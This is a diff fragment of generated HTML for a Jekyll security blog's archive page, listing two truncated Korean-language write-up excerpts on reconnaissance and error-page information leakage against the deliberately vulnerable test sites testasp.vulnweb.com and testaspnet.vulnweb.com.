+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+
+
+
+
+Information Leakage
+서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음
+http://testaspnet.vulnwe...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="permalink">[ VulnWebs ] - testasp.vulnweb.com
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+
+
+
+RECON
+
+
+OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+
+Information Leakage
+임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴
+http://testasp.vulnweb.com/showfor...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 A1mH1gh. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
